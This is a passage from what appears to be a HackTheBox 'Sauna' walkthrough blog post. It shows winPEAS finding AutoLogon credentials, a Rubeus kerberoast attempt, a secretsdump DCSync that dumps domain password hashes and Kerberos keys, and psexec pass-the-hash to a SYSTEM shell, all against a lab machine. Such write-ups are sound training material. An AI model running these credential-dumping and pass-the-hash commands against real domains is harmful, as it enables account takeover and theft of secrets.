class="hljs-string">-07</span>:00|INFORMATION|Consumers finished, closing output channel<br>Closing writers<br>2026<span class="hljs-string">-04</span><span class="hljs-string">-30</span>T06:36:34.0391523<span class="hljs-string">-07</span>:00|INFORMATION|Output channel closed, waiting for output task to complete<br>2026<span class="hljs-string">-04</span><span class="hljs-string">-30</span>T06:36:34.1490701<span class="hljs-string">-07</span>:00|INFORMATION|Status: 297 objects finished (<span class="hljs-string">+297</span> 42.42857)/s -- Using 70 MB RAM<br>2026<span class="hljs-string">-04</span><span class="hljs-string">-30</span>T06:36:34.1490701<span class="hljs-string">-07</span>:00|INFORMATION|Enumeration finished in 00:00:07.8041284<br>2026<span class="hljs-string">-04</span><span class="hljs-string">-30</span>T06:36:34.2266442<span class="hljs-string">-07</span>:00|INFORMATION|Saving cache with stats: 16 ID to type mappings.<br> 0 name to SID mappings.<br> 1 machine sid mappings.<br> 2 sid to domain mappings.<br> 0 global catalog mappings.<br>2026<span class="hljs-string">-04</span><span class="hljs-string">-30</span>T06:36:34.2579125<span class="hljs-string">-07</span>:00|INFORMATION|SharpHound Enumeration Completed at 6:36 AM on 4/30/2026! Happy Graphing!<br>*Evil-WinRM* PS C:\Users\FSmith\Documents&gt; dir<br><br><br>    Directory: C:\Users\FSmith\Documents<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-a----        4/30/2026   6:36 AM          30530 20260430063628_BloodHound.zip<br>-a----        4/30/2026   6:36 AM        1351680 SharpHound.exe<br>-a----        4/30/2026   6:36 AM           1308 ZDFkMDEyYjYtMmE1ZS00YmY3LTk0OWItYTM2OWVmMjc5NDVk.bin<br><br><br></code></pre></td></tr></table></figure>
+
+<p>上传winpeas进行进一步枚举</p>
+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">ÉÍÍÍÍÍÍÍÍÍÍ¹ <span class="hljs-variable">Home</span> <span class="hljs-variable">folders</span> <span class="hljs-variable">found</span> <span class="hljs-punctuation">(</span><span class="hljs-variable">T1083</span><span class="hljs-punctuation">)</span><br>    <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">Users</span>\<span class="hljs-variable">Administrator</span><br>    <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">Users</span>\<span class="hljs-built_in">All</span> <span class="hljs-variable">Users</span><br>    <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">Users</span>\<span class="hljs-built_in">Default</span><br>    <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">Users</span>\<span class="hljs-built_in">Default</span> <span class="hljs-variable">User</span><br>    <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">Users</span>\<span class="hljs-variable">FSmith</span> <span class="hljs-operator">:</span> <span class="hljs-variable">FSmith</span> <span class="hljs-punctuation">[</span><span class="hljs-variable">Allow</span><span class="hljs-operator">:</span> <span class="hljs-variable">AllAccess</span><span class="hljs-punctuation">]</span><br>    <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">Users</span>\<span class="hljs-variable">Public</span><br>    <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">Users</span>\<span class="hljs-type">svc_loanmgr</span><br><br>ÉÍÍÍÍÍÍÍÍÍÍ¹ <span class="hljs-variable">Looking</span> <span class="hljs-variable">for</span> <span class="hljs-variable">AutoLogon</span> <span class="hljs-variable">credentials</span> <span class="hljs-punctuation">(</span><span class="hljs-variable">T1552</span><span class="hljs-number">.002</span><span class="hljs-punctuation">)</span><br>    <span class="hljs-variable">Some</span> <span class="hljs-variable">AutoLogon</span> <span class="hljs-variable">credentials</span> <span class="hljs-variable">were</span> <span class="hljs-variable">found</span><br>    <span class="hljs-variable">DefaultDomainName</span>             <span class="hljs-operator">:</span>  <span class="hljs-variable">EGOTISTICALBANK</span><br>    <span class="hljs-variable">DefaultUserName</span>               <span class="hljs-operator">:</span>  <span class="hljs-variable">EGOTISTICALBANK</span>\<span class="hljs-type">svc_loanmanager</span><br>    <span class="hljs-variable">DefaultPassword</span>               <span class="hljs-operator">:</span>  <span class="hljs-variable">Moneymakestheworldgoround</span><span class="hljs-operator">!</span><br><br><br></code></pre></td></tr></table></figure>
+
+<p>发现一组凭据</p>
+<p>同时也发现了对应的用户</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Computer</span> Name           :   SAUNA<br><span class="hljs-attribute">User</span> Name               :   svc_loanmgr<br><span class="hljs-attribute">User</span> Id                 :   <span class="hljs-number">1108</span><br><span class="hljs-attribute">Is</span> Enabled              :   True<br><span class="hljs-attribute">User</span> Type               :   User<br><span class="hljs-attribute">Comment</span>                 :<br><span class="hljs-attribute">Last</span> Logon              :   <span class="hljs-number">1</span>/<span class="hljs-number">1</span>/<span class="hljs-number">1970</span> <span class="hljs-number">12</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> AM<br><span class="hljs-attribute">Logons</span> Count            :   <span class="hljs-number">0</span><br><span class="hljs-attribute">Password</span> Last Set       :   <span class="hljs-number">1</span>/<span class="hljs-number">24</span>/<span class="hljs-number">2020</span> <span class="hljs-number">4</span>:<span class="hljs-number">48</span>:<span class="hljs-number">31</span> PM<br><br></code></pre></td></tr></table></figure>
+
+<p>查看bloodhound域相关信息，发现该用户对域具有 <strong>DCSync</strong> 权限</p>
+<p>另外还发现了一些有意思的东西</p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs smali">ÉÍÍÍÍÍÍÍÍÍÍ¹ Kerberoasting / service ticket risks (T1558.003)<br>È Enumerate weak SPN accounts<span class="hljs-built_in"> and </span>legacy Kerberos crypto https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/kerberoast.html<br>  [-] Domain default supported encryption types<span class="hljs-built_in"> not </span>set (legacy compatibility defaults to RC4).<br>  krbtgt supports: Unspecified (inherits defaults / RC4 compatible) - RC4 TGTs can still be issued.<br>È Checked 3 SPN-bearing accounts. High-risk RC4/privileged targets: 1,<span class="hljs-built_in"> long-lived </span>AES-only targets: 0.<br>  [!] RC4-enabled<span class="hljs-built_in"> or </span>privileged SPN accounts:<br>      - HSmith (Hugo Smith) | SPNs: SAUNA/HSmith.EGOTISTICALBANK.LOCAL:60111 | Enc: Unspecified (inherits defaults / RC4 compatible) | RC4 allowed; PasswordNeverExpires; PwdLastSet 2020-01-23<br><br><br></code></pre></td></tr></table></figure>
+
+<p>HSmith注册了SPN，那我们可以通过上传Rubeus的方法获取当前用户的TGT</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs gherkin"><span class="hljs-symbol">*</span>Evil-WinRM<span class="hljs-symbol">*</span> PS C:\Users\FSmith\Documents&gt; .\Rubeus.exe kerberoast /user:HSmith<br><br>   ______        _<br>  (_____ \      |<span class="hljs-string"> </span>|<br>   _____) )_   _|<span class="hljs-string"> </span>|<span class="hljs-string">__  _____ _   _  ___</span><br><span class="hljs-string">  </span>|<span class="hljs-string">  __  /</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">  _ \</span>|<span class="hljs-string"> ___ </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">/___)</span><br><span class="hljs-string">  </span>|<span class="hljs-string"> </span>|<span class="hljs-string">  \ \</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">_) ) ____</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">___ </span>|<br>  |<span class="hljs-string">_</span>|<span class="hljs-string">   </span>|<span class="hljs-string">_</span>|<span class="hljs-string">____/</span>|<span class="hljs-string">____/</span>|<span class="hljs-string">_____)____/(___/</span><br><span class="hljs-string"></span><br><span class="hljs-string">  v2.2.0</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">[*] Action: Kerberoasting</span><br><span class="hljs-string"></span><br><span class="hljs-string">[*] NOTICE: AES hashes will be returned for AES-enabled accounts.</span><br><span class="hljs-string">[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[*] Target User            : HSmith</span><br><span class="hljs-string">[*] Target Domain          : EGOTISTICAL-BANK.LOCAL</span><br><span class="hljs-string">[*] Searching path &#x27;LDAP://SAUNA.EGOTISTICAL-BANK.LOCAL/DC=EGOTISTICAL-BANK,DC=LOCAL&#x27; for &#x27;(&amp;(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=HSmith)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">[*] Total kerberoastable users : 1</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">[*] SamAccountName         : HSmith</span><br><span class="hljs-string">[*] DistinguishedName      : CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL</span><br><span class="hljs-string">[*] ServicePrincipalName   : SAUNA/HSmith.EGOTISTICALBANK.LOCAL:60111</span><br><span class="hljs-string">[*] PwdLastSet             : 1/22/2020 9:54:34 PM</span><br><span class="hljs-string">[*] Supported ETypes       : RC4_HMAC_DEFAULT</span><br><span class="hljs-string"></span><br><span class="hljs-string"> [X] Error during request for SPN SAUNA/HSmith.EGOTISTICALBANK.LOCAL:60111@EGOTISTICAL-BANK.LOCAL : No credentials are available in the security package</span><br><span class="hljs-string"></span><br><span class="hljs-string">*Evil-WinRM* PS C:\Users\FSmith\Documents&gt; </span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
+
+<p>失败了</p>
+<blockquote>
+<p>当你使用 <code>evil-winrm</code> 连接到目标机器时，Windows 使用的是<strong>网络登录 (Network Logon - Type 3)</strong>。在这种登录类型下，Windows 本地安全机构 (LSA) <strong>不会</strong>在内存中缓存该用户的明文密码或可复用的 Kerberos TGT。因为 Rubeus 的 <code>kerberoast</code> 模块默认需要从当前会话的 LSA 内存中提取 TGT 去向 KDC 申请 TGS 票据，而在 WinRM 的会话中，LSA 里是“空”的（没有可用的凭据包），所以会直接报错。</p>
+</blockquote>
+<p>那换种方法，手动获取tgt</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs gherkin"><span class="hljs-symbol">*</span>Evil-WinRM<span class="hljs-symbol">*</span> PS C:\Users\FSmith\Documents&gt; .\Rubeus.exe asktgt /user:fsmith /password:Thestrokes23 /domain:EGOTISTICAL-BANK.LOCAL /nowrap<br><br>   ______        _<br>  (_____ \      |<span class="hljs-string"> </span>|<br>   _____) )_   _|<span class="hljs-string"> </span>|<span class="hljs-string">__  _____ _   _  ___</span><br><span class="hljs-string">  </span>|<span class="hljs-string">  __  /</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">  _ \</span>|<span class="hljs-string"> ___ </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">/___)</span><br><span class="hljs-string">  </span>|<span class="hljs-string"> </span>|<span class="hljs-string">  \ \</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">_) ) ____</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">___ </span>|<br>  |<span class="hljs-string">_</span>|<span class="hljs-string">   </span>|<span class="hljs-string">_</span>|<span class="hljs-string">____/</span>|<span class="hljs-string">____/</span>|<span class="hljs-string">_____)____/(___/</span><br><span class="hljs-string"></span><br><span class="hljs-string">  v2.2.0</span><br><span class="hljs-string"></span><br><span class="hljs-string">[*] Action: Ask TGT</span><br><span class="hljs-string"></span><br><span class="hljs-string">[*] Using rc4_hmac hash: 58A52D36C84FB7F5F1BEAB9A201DB1DD</span><br><span class="hljs-string">[*] Building AS-REQ (w/ preauth) for: &#x27;EGOTISTICAL-BANK.LOCAL\fsmith&#x27;</span><br><span class="hljs-string">[*] Using domain controller: fe80::685d:94a3:15a2:5147%7:88</span><br><span class="hljs-string">[+] TGT request successful!</span><br><span class="hljs-string">[*] base64(ticket.kirbi):</span><br><span class="hljs-string"></span><br><span class="hljs-string">      doIFajCCBWagAwIBBaEDAgEWooIEYzCCBF9hggRbMIIEV6ADAgEFoRgbFkVHT1RJU1RJQ0FMLUJBTksuTE9DQUyiKzApoAMCAQKhIjAgGwZrcmJ0Z3QbFkVHT1RJU1RJQ0FMLUJBTksuTE9DQUyjggQHMIIEA6ADAgESoQMCAQKiggP1BIID8WxkZ2xE813Qg4BKU0yWJnSzHXWV7GZHxw98xdWQX93YZdwHcQr1i/eXYTc11/qBFdZKoazMe5a4BqBiUCiB1JbzbBAkdEPwFciJygo9hAsqCLhOurSQHkJUHiBeNOl12otJjQBYyTJZOGzVlDOEZGVCssz88QS9Gb1UccWyQ3nsOBQBzNLsIKAQ2aTSLlxd4dKntJpICcjgO2+vtA3mY8W68jkYYL+HF2+Z3dcccw0qQ487j5eR7NGQF76KLZGIUGJyuUfuDCEbUDoh3bEBl8ZWEJ8GqsNs8CwcbOjCD+5Qdj7gfMxe7BXCLDwcDbjwL4kI4sQoMSgKrsNE2ws7jYiX9p+piWI3MmmUeHCQfse9y3g+Joe5FIwAXrK2ZYdASwTyd6w6OvRDR0JCXvbA7Qus2XxNoFSIhhRO7Za9jj8px+fr+s5stLPwa4NDmucgpH3Qp8mC6muOqBsT2+FgoBEhGaYVjjZmiB8flLahe3rsmhO70Ly4A6k8Nzka+BzbLQqLn3MFY9lQWtWTcia7Yhf6JRb2l5xf78X0bhk8GlgYINBFAvetqwESgqkDzzpSMlLe77nGBCDkr7JeDAjOl1wKDG0BrpfewaY1egJZjnRAA5RBsPFKfudZDMqNkMOfHRV3XYDCFTcC5fcmlcI93PxbItWOBf1JUEUJ1a5QQnvzBqwhAXNM2oaW7DSphMXdZdGwmPRXUtXXwruTwUAdORh7YF6xM1V+MeZRwuUjD3gW3rttyP4jSqBEHMVZTdbCIYJcttytyrvaXyn/gpNnS5Kocol9LvFXqoxniOEByQAgNvX6khONGKtGxNiq2t7as43Cv936xweuaMS64zdf8f1NUU6S2rTfpaMuvgFeAex0B/QH8GTvch6fTxKHMdzj8lKK2zwFfRDXFOE5xZow8FGjqqC24yNGlcZUkqMZeiLv46pDAGsRtxd2FHVtzl4FDyA5QAKOa6Q2+MSDUeFPYyTK5J4bVJDElLz8FCUxOTDRTHySBoJwi1FtdulMQqr9TCHSRPsF4iv4yh3p5PrBf/eV74KHvS7elN8XeWJl1LGmtN0CMDQZthXQqarknVYirpLze5AeAXAQ8HNtaYjE+lK8vSHORLEYsxSvphhmJbUrWQjYHX+67u4C5x/I4spwYicCSPO4Q9niEvfOQSr727p+4/ZBwp9M/slVEIVvZAMMD4XzayWt8aARwz3jx+5TEwgGgOH2w7q2QUoFoCLKLa9Q1+wNgaWOcA3FIRRHb7ntrZOaFYBDdoSsHIzJ+MlX+KXlR+tf2HHMsRtHAvp8e/u6PL7e7IUjABvaGqvMfBOyFL7/dFeON3LOEhEeWmJ+m8WjgfIwge+gAwIBAKKB5wSB5H2B4TCB3qCB2zCB2DCB1aAbMBmgAwIBF6ESBBAHI36FeaiAD3wWtMy67xvkoRgbFkVHT1RJU1RJQ0FMLUJBTksuTE9DQUyiEzARoAMCAQGhCjAIGwZmc21pdGijBwMFAEDhAAClERgPMjAyNjA0MzAxNDA4MzBaphEYDzIwMjYwNTAxMDAwODMwWqcRGA8yMDI2MDUwNzE0MDgzMFqoGBsWRUdPVElTVElDQUwtQkFOSy5MT0NBTKkrMCmgAwIBAqEiMCAbBmtyYnRndBsWRUdPVElTVElDQUwtQkFOSy5MT0NBTA==</span><br><span class="hljs-string"></span><br><span class="hljs-string">  ServiceName              :  krbtgt/EGOTISTICAL-BANK.LOCAL</span><br><span class="hljs-string">  ServiceRealm             :  EGOTISTICAL-BANK.LOCAL</span><br><span class="hljs-string">  UserName                 :  fsmith</span><br><span class="hljs-string">  UserRealm                :  EGOTISTICAL-BANK.LOCAL</span><br><span class="hljs-string">  StartTime                :  4/30/2026 7:08:30 AM</span><br><span class="hljs-string">  EndTime                  :  4/30/2026 5:08:30 PM</span><br><span class="hljs-string">  RenewTill                :  5/7/2026 7:08:30 AM</span><br><span class="hljs-string">  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable</span><br><span class="hljs-string">  KeyType                  :  rc4_hmac</span><br><span class="hljs-string">  Base64(key)              :  ByN+hXmogA98FrTMuu8b5A==</span><br><span class="hljs-string">  ASREP (key)              :  58A52D36C84FB7F5F1BEAB9A201DB1DD</span><br><span class="hljs-string"></span><br><span class="hljs-string">*Evil-WinRM* PS C:\Users\FSmith\Documents&gt; </span><br></code></pre></td></tr></table></figure>
+
+<p>不在这里浪费时间了，直接secretsdump执行dsync攻击</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">impacket</span>-secretsdump -dc-ip <span class="hljs-number">10.129.95.180</span> &#x27;EGOTISTICAL-BANK.LOCAL/svc_loanmgr:Moneymakestheworldgoround!@<span class="hljs-number">10.129.95.180</span>&#x27;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs makefile">┌─[root@htb-hlx1pljzsg]─[/home/skyarrow/Desktop]<br>└──╼ <span class="hljs-comment">#impacket-secretsdump -dc-ip 10.129.95.180 EGOTISTICAL-BANK.LOCAL/svc_loanmgr:Moneymakestheworldgoround\!@10.129.95.180</span><br>Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies <br><br>[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied <br>[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)<br>[*] Using the DRSUAPI method to get NTDS.DIT secrets<br><span class="hljs-section">Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::</span><br><span class="hljs-section">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="hljs-section">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::</span><br><span class="hljs-section">EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::</span><br><span class="hljs-section">EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::</span><br><span class="hljs-section">EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::</span><br><span class="hljs-section">SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:7b0133989569a3966019b179f44c089c:::</span><br>[*] Kerberos keys grabbed<br><span class="hljs-section">Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657</span><br><span class="hljs-section">Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e</span><br><span class="hljs-section">Administrator:des-cbc-md5:fb8f321c64cea87f</span><br><span class="hljs-section">krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24</span><br><span class="hljs-section">krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9</span><br><span class="hljs-section">krbtgt:des-cbc-md5:c170d5dc3edfc1d9</span><br><span class="hljs-section">EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324</span><br><span class="hljs-section">EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9</span><br><span class="hljs-section">EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7</span><br><span class="hljs-section">EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2</span><br><span class="hljs-section">EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b</span><br><span class="hljs-section">EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b</span><br><span class="hljs-section">EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba</span><br><span class="hljs-section">EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c</span><br><span class="hljs-section">EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2</span><br><span class="hljs-section">SAUNA$:aes256-cts-hmac-sha1-96:4eb1a9dac3cfba016326537d73846e773199dc3dc3bd5c0d9000eddc0afdead3</span><br><span class="hljs-section">SAUNA$:aes128-cts-hmac-sha1-96:01da32b8605ccbe020cc269dfa58e1e5</span><br><span class="hljs-section">SAUNA$:des-cbc-md5:104c515b86739e08</span><br>[*] Cleaning up... <br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs prolog">┌─[root@htb-hlx1pljzsg]─[/home/skyarrow/<span class="hljs-symbol">Desktop</span>]<br>└──╼ #impacket-psexec <span class="hljs-symbol">EGOTISTICAL</span>-<span class="hljs-symbol">BANK</span>.<span class="hljs-symbol">LOCAL</span>/administrator@<span class="hljs-number">10.129</span><span class="hljs-number">.95</span><span class="hljs-number">.180</span> -hashes aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">823452073</span>d75b9d1cf70ebdf86c7f98e<br><span class="hljs-symbol">Impacket</span> v0<span class="hljs-number">.13</span><span class="hljs-number">.0</span>.dev0+<span class="hljs-number">20250130.104306</span><span class="hljs-number">.0</span>f4b866 - <span class="hljs-symbol">Copyright</span> <span class="hljs-symbol">Fortra</span>, <span class="hljs-symbol">LLC</span> and its affiliated companies <br><br>[*] <span class="hljs-symbol">Requesting</span> shares on <span class="hljs-number">10.129</span><span class="hljs-number">.95</span><span class="hljs-number">.180</span>.....<br>[*] <span class="hljs-symbol">Found</span> writable share <span class="hljs-symbol">ADMIN</span>$<br>[*] <span class="hljs-symbol">Uploading</span> file ofuoFiAQ.exe<br>[*] <span class="hljs-symbol">Opening</span> <span class="hljs-symbol">SVCManager</span> on <span class="hljs-number">10.129</span><span class="hljs-number">.95</span><span class="hljs-number">.180</span>.....<br>[*] <span class="hljs-symbol">Creating</span> service crdP on <span class="hljs-number">10.129</span><span class="hljs-number">.95</span><span class="hljs-number">.180</span>.....<br>[*] <span class="hljs-symbol">Starting</span> service crdP.....<br>[!] <span class="hljs-symbol">Press</span> help for extra shell commands<br><span class="hljs-symbol">Microsoft</span> <span class="hljs-symbol">Windows</span> [<span class="hljs-symbol">Version</span> <span class="hljs-number">10.0</span><span class="hljs-number">.17763</span><span class="hljs-number">.973</span>]<br>(c) <span class="hljs-number">2018</span> <span class="hljs-symbol">Microsoft</span> <span class="hljs-symbol">Corporation</span>. <span class="hljs-symbol">All</span> rights reserved.<br><br><span class="hljs-symbol">C</span>:\<span class="hljs-symbol">Windows</span>\system32&gt; whoami<br>nt authority\system<br><br><span class="hljs-symbol">C</span>:\<span class="hljs-symbol">Windows</span>\system32&gt; <br><span class="hljs-symbol">C</span>:\<span class="hljs-symbol">Windows</span>\system32&gt; type c:\users\administrator\desktop\root.txt<br><span class="hljs-number">56</span>b9ce82a467af9d7bd8638c62af7869<br><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/HTB/" class="print-no-link">#HTB</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HackTheBox-Sauna</div>
+      <div>http://example.com/2026/04/30/HackTheBox-Sauna/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Skyarrow</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>April 30, 2026</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/05/03/Mazesec-Safe/" title="Mazesec-Safe">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Mazesec-Safe</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/04/25/OSCP-Challenge-5-OSCP-B/" title="OSCP-Challenge-5-OSCP-B">
+                        <span class="hidden-mobile">OSCP-Challenge-5-OSCP-B</span>
+                        <span class="visible-mobile">Next</span>
